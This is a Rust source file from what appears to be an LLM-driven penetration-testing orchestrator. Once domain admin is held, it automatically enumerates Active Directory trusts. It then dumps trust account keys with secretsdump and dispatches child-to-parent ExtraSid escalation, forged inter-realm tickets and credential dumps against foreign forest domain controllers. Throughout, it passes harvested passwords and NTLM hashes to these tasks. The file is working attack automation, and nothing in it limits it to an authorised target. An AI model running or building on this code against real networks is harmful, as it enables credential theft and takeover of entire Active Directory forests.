//! auto_trust_follow -- trust enumeration, key extraction, and cross-domain attacks.
//!
//! Three-phase automation:
//!
//! 1. **Trust enumeration**: When DA is achieved, dispatch `enumerate_domain_trusts`
//!    to discover trust relationships via LDAP.
//! 2. **Trust key extraction**: When trusts are known and DA creds are available,
//!    dispatch secretsdump for trust account hashes (e.g. `FABRIKAM$`).
//! 3. **Trust follow**: When a trust account hash is found, dispatch inter-realm
//!    ticket creation and secretsdump against the foreign DC.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Monitors for trust account hashes and dispatches cross-domain attacks.
/// Interval: 30s.
pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Auto-enumerate trusts when DA is achieved
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin {
                // Dispatch trust enumeration for each known DC.
                // Two dedup keys per domain:
                //   trust_enum:<domain> — password-based attempt
                //   trust_enum_hash:<domain> — hash-based retry (for dominated domains)
                let enum_work: Vec<(String, String, String)> = state
                    .domain_controllers
                    .iter()
                    .filter(|(domain, _)| {
                        let key = format!("trust_enum:{}", domain.to_lowercase());
                        let hash_key = format!("trust_enum_hash:{}", domain.to_lowercase());
                        !state.is_processed(DEDUP_TRUST_FOLLOW, &key)
                            || (!state.is_processed(DEDUP_TRUST_FOLLOW, &hash_key)
                                && state.dominated_domains.contains(&domain.to_lowercase()))
                    })
                    .map(|(domain, dc_ip)| {
                        // Use hash_key if password-based was already tried
                        let pw_key = format!("trust_enum:{}", domain.to_lowercase());
                        let key = if state.is_processed(DEDUP_TRUST_FOLLOW, &pw_key) {
                            format!("trust_enum_hash:{}", domain.to_lowercase())
                        } else {
                            pw_key
                        };
                        (key, domain.clone(), dc_ip.clone())
                    })
                    .collect();
                drop(state);

                for (key, domain, dc_ip) in enum_work {
                    // Find a credential for this domain — prefer password creds,
                    // fall back to admin NTLM hash for hash-based LDAP auth.
                    let (cred_payload, auth_method) = {
                        let s = dispatcher.state.read().await;
                        let dd = domain.to_lowercase();

                        // On hash-based retry, skip password creds entirely —
                        // they already failed on the first attempt (typically a
                        // child-domain credential that can't LDAP-bind to the
                        // parent DC with the wrong domain context).
                        let is_hash_retry = key.starts_with("trust_enum_hash:");

                        // First try: password credential (exact or child↔parent match)
                        let pw_cred = if !is_hash_retry {
                            s.credentials
                                .iter()
                                .find(|c| {
                                    if c.password.is_empty() {
                                        return false;
                                    }
                                    let cd = c.domain.to_lowercase();
                                    cd == dd
                                        || cd.ends_with(&format!(".{}", dd))
                                        || dd.ends_with(&format!(".{}", cd))
                                })
                                .cloned()
                        } else {
                            None
                        };

                        if let Some(cred) = pw_cred {
                            (
                                Some(json!({
                                    "username": cred.username,
                                    "password": cred.password,
                                    "domain": cred.domain,
                                })),
                                "password",
                            )
                        } else {
                            // Fallback: find an admin NTLM hash for this exact domain
                            let admin_hash = s.hashes.iter().find(|h| {
                                h.hash_type.to_lowercase() == "ntlm"
                                    && h.domain.to_lowercase() == dd
                                    && h.username.to_lowercase() == "administrator"
                            });
                            if let Some(h) = admin_hash {
                                (
                                    Some(json!({
                                        "username": "Administrator",
                                        "hash": h.hash_value.clone(),
                                        "domain": domain,
                                    })),
                                    "hash",
                                )
                            } else {
                                (None, "none")
                            }
                        }
                    };

                    if let Some(cred_json) = cred_payload {
                        let payload = json!({
                            "techniques": ["enumerate_domain_trusts"],
                            "target_ip": dc_ip,
                            "domain": domain,
                            "credential": cred_json,
                        });

                        match dispatcher
                            .throttled_submit("recon", "recon", payload, 3)
                            .await
                        {
                            Ok(Some(task_id)) => {
                                info!(
                                    task_id = %task_id,
                                    domain = %domain,
                                    auth = auth_method,
                                    "Trust enumeration dispatched"
                                );
                                dispatcher
                                    .state
                                    .write()
                                    .await
                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                                let _ = dispatcher
                                    .state
                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                    .await;
                            }
                            Ok(None) => {
                                debug!(domain = %domain, "Trust enum throttled — deferred");
                            }
                            Err(e) => warn!(err = %e, "Failed to dispatch trust enumeration"),
                        }
                    }
                }
            }
        }

        // Child-to-parent escalation (ExtraSid via raiseChild)
        //
        // When a parent_child trust is discovered and the child domain is dominated,
        // dispatch a child_to_parent exploit task.  The LLM prompt offers raiseChild
        // (automated) and manual ExtraSid golden ticket as alternatives.
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin && !state.trusted_domains.is_empty() {
                let child_work: Vec<(String, String, String, String)> = state
                    .trusted_domains
                    .values()
                    .filter(|trust| trust.is_parent_child())
                    .filter_map(|trust| {
                        let parent_domain = &trust.domain;

                        // Skip if parent is already dominated
                        if state
                            .dominated_domains
                            .contains(&parent_domain.to_lowercase())
                        {
                            return None;
                        }

                        // Find a dominated child domain for this parent
                        // (child FQDN ends with .{parent})
                        let child_domain = state.dominated_domains.iter().find(|d| {
                            d.to_lowercase()
                                .ends_with(&format!(".{}", parent_domain.to_lowercase()))
                        })?;

                        let key = format!("raise_child:{}", child_domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            return None;
                        }

                        let dc_ip = state
                            .domain_controllers
                            .get(&child_domain.to_lowercase())
                            .cloned()?;

                        Some((key, child_domain.clone(), parent_domain.clone(), dc_ip))
                    })
                    .collect();
                drop(state);

                for (key, child_domain, parent_domain, dc_ip) in child_work {
                    // Find admin credential for the child domain:
                    // prefer password, fall back to NTLM hash.
                    let (cred_payload, auth_method): (Option<serde_json::Value>, &str) = {
                        let s = dispatcher.state.read().await;
                        let cd = child_domain.to_lowercase();

                        let pw_cred = s
                            .credentials
                            .iter()
                            .find(|c| {
                                c.is_admin
                                    && !c.password.is_empty()
                                    && c.domain.to_lowercase() == cd
                            })
                            .cloned();

                        if let Some(cred) = pw_cred {
                            (
                                Some(json!({
                                    "username": cred.username,
                                    "password": cred.password,
                                })),
                                "password",
                            )
                        } else {
                            let admin_hash = s
                                .hashes
                                .iter()
                                .find(|h| {
                                    h.username.to_lowercase() == "administrator"
                                        && h.domain.to_lowercase() == cd
                                        && h.hash_type.to_uppercase() == "NTLM"
                                })
                                .cloned();

                            if let Some(h) = admin_hash {
                                (
                                    Some(json!({
                                        "username": "Administrator",
                                        "admin_hash": h.hash_value,
                                    })),
                                    "hash",
                                )
                            } else {
                                (None, "none")
                            }
                        }
                    };

                    let cred = match cred_payload {
                        Some(c) => c,
                        None => {
                            debug!(
                                child_domain = %child_domain,
                                parent_domain = %parent_domain,
                                "No admin cred/hash for child domain — deferring child-to-parent"
                            );
                            continue;
                        }
                    };

                    // Publish vulnerability
                    let vuln_id = format!(
                        "child_to_parent_{}_{}",
                        child_domain.to_lowercase().replace('.', "_"),
                        parent_domain.to_lowercase().replace('.', "_"),
                    );
                    {
                        let mut details = std::collections::HashMap::new();
                        details.insert(
                            "source_domain".into(),
                            serde_json::Value::String(child_domain.clone()),
                        );
                        details.insert(
                            "target_domain".into(),
                            serde_json::Value::String(parent_domain.clone()),
                        );
                        details.insert(
                            "note".into(),
                            serde_json::Value::String(format!(
                                "Child-to-parent escalation via ExtraSid — {} → {}",
                                child_domain, parent_domain
                            )),
                        );
                        let vuln = ares_core::models::VulnerabilityInfo {
                            vuln_id: vuln_id.clone(),
                            vuln_type: "child_to_parent".to_string(),
                            target: dc_ip.clone(),
                            discovered_by: "trust_automation".to_string(),
                            discovered_at: chrono::Utc::now(),
                            details,
                            recommended_agent: String::new(),
                            priority: 1,
                        };
                        let _ = dispatcher
                            .state
                            .publish_vulnerability(&dispatcher.queue, vuln)
                            .await;
                    }

                    // Dispatch child-to-parent exploit task.  The LLM prompt
                    // offers raiseChild (automated) and manual ExtraSid golden
                    // ticket creation as alternatives.
                    let mut payload = json!({
                        "technique": "create_inter_realm_ticket",
                        "vuln_type": "child_to_parent",
                        "domain": child_domain,
                        "trusted_domain": parent_domain,
                        "target_domain": parent_domain,
                        "target": &dc_ip,
                        "dc_ip": dc_ip,
                        "vuln_id": &vuln_id,
                    });
                    // Merge credential fields
                    if let Some(obj) = cred.as_object() {
                        for (k, v) in obj {
                            payload[k] = v.clone();
                        }
                    }
                    // Add domain SIDs if already resolved
                    {
                        let s = dispatcher.state.read().await;
                        if let Some(sid) = s.domain_sids.get(&child_domain.to_lowercase()) {
                            payload["source_sid"] = json!(sid);
                        }
                        if let Some(sid) = s.domain_sids.get(&parent_domain.to_lowercase()) {
                            payload["target_sid"] = json!(sid);
                        }
                    }

                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, 1)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                child_domain = %child_domain,
                                parent_domain = %parent_domain,
                                auth = auth_method,
                                "Child-to-parent escalation dispatched"
                            );
                            let _ = dispatcher
                                .state
                                .mark_exploited(&dispatcher.queue, &vuln_id)
                                .await;
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                .await;
                        }
                        Ok(None) => {
                            debug!("Child-to-parent deferred by throttler");
                        }
                        Err(e) => {
                            warn!(err = %e, "Failed to dispatch child-to-parent escalation")
                        }
                    }
                }
            }
        }

        // Extract trust keys for known cross-forest trusts
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin && !state.trusted_domains.is_empty() {
                // Collect trust work with per-trust source domain:
                // use a dominated domain that has a known DC (excluding the trust target).
                // IMPORTANT: prefer the forest root DC — trust accounts (e.g. FOREIGNDOMAIN$)
                // live on the forest root DC, not child domain DCs. A secretsdump with
                // -just-dc-user FOREIGNDOMAIN$ against a child DC returns nothing.
                let extract_work: Vec<(String, String, String, String, String)> = state
                    .trusted_domains
                    .values()
                    .filter(|trust| trust.is_cross_forest())
                    .filter_map(|trust| {
                        let key = format!("trust_extract:{}", trust.domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            return None;
                        }
                        // Find a DC in a dominated source domain (not the foreign trust target).
                        // Prefer the forest root (fewest domain parts) since trust accounts
                        // are stored on the forest root DC.
                        let (source_domain, dc_ip) = state
                            .domain_controllers
                            .iter()
                            .filter(|(domain, _)| {
                                domain.to_lowercase() != trust.domain.to_lowercase()
                                    && state.dominated_domains.contains(&domain.to_lowercase())
                            })
                            .min_by_key(|(domain, _)| domain.split('.').count())
                            .map(|(d, ip)| (d.clone(), ip.clone()))?;
                        Some((
                            key,
                            trust.flat_name.clone(),
                            trust.domain.clone(),
                            dc_ip,
                            source_domain,
                        ))
                    })
                    .collect();
                // Prefer plaintext admin credential (domain-agnostic; refined per-trust below).
                let admin_cred = state
                    .credentials
                    .iter()
                    .find(|c| c.is_admin && !c.password.is_empty())
                    .cloned();
                drop(state);

                for (key, flat_name, trust_domain, dc_ip, source_domain) in extract_work {
                    // Find admin hash specifically for this trust's source domain.
                    // DA is typically achieved via hash-based attacks like secretsdump,
                    // so admin creds often only exist as hashes, not plaintext passwords.
                    let admin_hash = if admin_cred.is_none() {
                        let s = dispatcher.state.read().await;
                        s.hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == "administrator"
                                    && h.domain.to_lowercase() == source_domain.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned()
                    } else {
                        None
                    };

                    // Build credential payload from either plaintext cred or NTLM hash
                    let cred_payload: Option<(String, String, serde_json::Value)> = if let Some(
                        ref cred,
                    ) =
                        admin_cred
                    {
                        Some((
                            cred.username.clone(),
                            cred.domain.clone(),
                            json!({
                                "username": cred.username,
                                "password": cred.password,
                                "domain": cred.domain,
                            }),
                        ))
                    } else if let Some(ref hash) = admin_hash {
                        Some((
                            hash.username.clone(),
                            source_domain.clone(),
                            json!({
                                "username": hash.username,
                                "domain": source_domain,
                            }),
                        ))
                    } else {
                        debug!(
                            trust_domain = %trust_domain,
                            source_domain = %source_domain,
                            "No admin cred/hash for source domain — deferring trust key extraction"
                        );
                        continue;
                    };

                    let (_, domain, cred_json) = cred_payload.unwrap();
                    // secretsdump -just-dc-user FABRIKAM$ to get trust key
                    let trust_account = format!("{}$", flat_name.to_uppercase());
                    let mut payload = json!({
                        "technique": "secretsdump",
                        "target_ip": dc_ip,
                        "domain": domain,
                        "just_dc_user": trust_account,
                        "credential": cred_json,
                        "reason": format!("extract trust key for {}", trust_domain),
                    });
                    if let Some(ref hash) = admin_hash {
                        payload["hash_value"] = json!(hash.hash_value);
                    }

                    match dispatcher
                        .throttled_submit("credential_access", "credential_access", payload, 2)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                trust_account = %trust_account,
                                trust_domain = %trust_domain,
                                source_domain = %source_domain,
                                auth = if admin_cred.is_some() { "password" } else { "hash" },
                                "Trust key extraction dispatched"
                            );
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                .await;
                        }
                        Ok(None) => {}
                        Err(e) => {
                            warn!(err = %e, "Failed to dispatch trust key extraction")
                        }
                    }
                }
            }
        }

        // Follow trust keys (inter-realm ticket + foreign secretsdump)
        let (work, admin_cred_phase3, admin_hash_phase3): (
            Vec<TrustFollowWork>,
            Option<ares_core::models::Credential>,
            Option<ares_core::models::Hash>,
        ) = {
            let state = dispatcher.state.read().await;

            // Skip if no domain admin yet — trust extraction requires DA-level creds
            if !state.has_domain_admin {
                continue;
            }

            // Build lookup of known trust flat names → TrustInfo so we only
            // process actual trust account hashes, not random machine accounts.
            let trust_by_flat: std::collections::HashMap<String, &ares_core::models::TrustInfo> =
                state
                    .trusted_domains
                    .values()
                    .map(|t| (t.flat_name.to_uppercase(), t))
                    .collect();

            let admin_cred = state
                .credentials
                .iter()
                .find(|c| c.is_admin && !c.password.is_empty())
                .cloned();
            // Find admin hash from any dominated domain with a DC
            let admin_hash = if admin_cred.is_none() {
                state
                    .domain_controllers
                    .keys()
                    .filter(|d| state.dominated_domains.contains(&d.to_lowercase()))
                    .find_map(|dom| {
                        state.hashes.iter().find(|h| {
                            h.username.to_lowercase() == "administrator"
                                && h.domain.to_lowercase() == dom.to_lowercase()
                                && h.hash_type.to_uppercase() == "NTLM"
                        })
                    })
                    .cloned()
            } else {
                None
            };

            let items = state
                .hashes
                .iter()
                .filter_map(|hash| {
                    if !hash.username.ends_with('$') {
                        return None;
                    }

                    // Only process hashes that match a known trust account
                    let netbios = hash.username.trim_end_matches('$').to_uppercase();
                    let trust = trust_by_flat.get(&netbios)?;

                    // Resolve source domain — fall back to first dominated domain
                    // with a DC when secretsdump output lacks domain prefix
                    let source_domain = if hash.domain.is_empty() {
                        state
                            .domain_controllers
                            .keys()
                            .find(|d| state.dominated_domains.contains(&d.to_lowercase()))
                            .cloned()
                            .unwrap_or_default()
                    } else {
                        hash.domain.clone()
                    };
                    if source_domain.is_empty() {
                        return None;
                    }

                    let dedup_key = format!(
                        "trust_follow:{}:{}",
                        source_domain.to_lowercase(),
                        hash.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                        return None;
                    }

                    // Use the FQDN from the trust relationship — never fall back
                    // to bare NetBIOS name which produces invalid domain strings.
                    let target_domain = trust.domain.clone();

                    let target_dc_ip = state
                        .domain_controllers
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    let source_domain_sid = state
                        .domain_sids
                        .get(&source_domain.to_lowercase())
                        .cloned();
                    let target_domain_sid = state
                        .domain_sids
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    let source_dc_ip = state
                        .domain_controllers
                        .get(&source_domain.to_lowercase())
                        .cloned();

                    Some(TrustFollowWork {
                        dedup_key,
                        hash: hash.clone(),
                        source_domain,
                        target_domain,
                        target_dc_ip,
                        source_domain_sid,
                        target_domain_sid,
                        source_dc_ip,
                    })
                })
                .collect();

            (items, admin_cred, admin_hash)
        };

        for item in work {
            let vuln_id = format!(
                "forest_trust_{}_{}",
                item.source_domain.to_lowercase(),
                item.target_domain.to_lowercase()
            );
            let trust_target = item
                .target_dc_ip
                .clone()
                .unwrap_or_else(|| item.target_domain.clone());
            {
                let mut details = std::collections::HashMap::new();
                details.insert(
                    "source_domain".into(),
                    serde_json::Value::String(item.source_domain.clone()),
                );
                details.insert(
                    "target_domain".into(),
                    serde_json::Value::String(item.target_domain.clone()),
                );
                details.insert(
                    "trust_account".into(),
                    serde_json::Value::String(item.hash.username.clone()),
                );
                details.insert(
                    "note".into(),
                    serde_json::Value::String(format!(
                        "Forest trust escalation via {} trust key — inter-realm ticket + secretsdump",
                        item.hash.username
                    )),
                );
                let vuln = ares_core::models::VulnerabilityInfo {
                    vuln_id: vuln_id.clone(),
                    vuln_type: "forest_trust_escalation".to_string(),
                    target: trust_target,
                    discovered_by: "trust_automation".to_string(),
                    discovered_at: chrono::Utc::now(),
                    details,
                    recommended_agent: String::new(),
                    priority: 1,
                };
                let _ = dispatcher
                    .state
                    .publish_vulnerability(&dispatcher.queue, vuln)
                    .await;
            }

            // 1. Dispatch inter-realm ticket creation.
            //    Use field names that match the tool and prompt expectations:
            //    - `vuln_type` routes to generate_trust_key_prompt
            //    - `source_sid`/`target_sid` match create_inter_realm_ticket tool
            //    - `trusted_domain` is read by the trust prompt
            //    - Include admin creds + dc_ip so the LLM can call get_sid if SIDs are missing
            let mut ticket_payload = json!({
                "technique": "create_inter_realm_ticket",
                "vuln_type": "cross_forest",
                "domain": item.source_domain,
                "trusted_domain": item.target_domain,
                "target_domain": item.target_domain,
                "target": item.target_dc_ip.as_deref().unwrap_or(&item.target_domain),
                "trust_key": item.hash.hash_value,
                "trust_account": item.hash.username,
                "vuln_id": &vuln_id,
            });
            if let Some(ref sid) = item.source_domain_sid {
                ticket_payload["source_sid"] = json!(sid);
            }
            if let Some(ref sid) = item.target_domain_sid {
                ticket_payload["target_sid"] = json!(sid);
            }
            if let Some(ref aes) = item.hash.aes_key {
                ticket_payload["aes_key"] = json!(aes);
            }
            if let Some(ref dc_ip) = item.source_dc_ip {
                ticket_payload["dc_ip"] = json!(dc_ip);
            }
            if let Some(ref cred) = admin_cred_phase3 {
                ticket_payload["username"] = json!(cred.username);
                ticket_payload["password"] = json!(cred.password);
            } else if let Some(ref hash) = admin_hash_phase3 {
                ticket_payload["username"] = json!(hash.username);
                ticket_payload["admin_hash"] = json!(hash.hash_value);
            }

            match dispatcher
                .throttled_submit("exploit", "privesc", ticket_payload, 1)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        trust_account = %item.hash.username,
                        source_domain = %item.source_domain,
                        target_domain = %item.target_domain,
                        has_source_sid = item.source_domain_sid.is_some(),
                        has_target_sid = item.target_domain_sid.is_some(),
                        "Inter-realm ticket task dispatched"
                    );
                    let _ = dispatcher
                        .state
                        .mark_exploited(&dispatcher.queue, &vuln_id)
                        .await;
                }
                Ok(None) => {
                    debug!("Inter-realm ticket deferred by throttler");
                    continue;
                }
                Err(e) => {
                    warn!(err = %e, "Failed to dispatch inter-realm ticket");
                    continue;
                }
            }

            // The privesc agent handles the full flow: forge inter-realm ticket →
            // secretsdump_kerberos against the target DC.  No separate credential_access
            // dispatch needed (it lacked valid auth and always failed).

            // Mark as processed
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                .await;
        }
    }
}

struct TrustFollowWork {
    dedup_key: String,
    hash: ares_core::models::Hash,
    source_domain: String,
    target_domain: String,
    target_dc_ip: Option<String>,
    source_domain_sid: Option<String>,
    target_domain_sid: Option<String>,
    source_dc_ip: Option<String>,
}
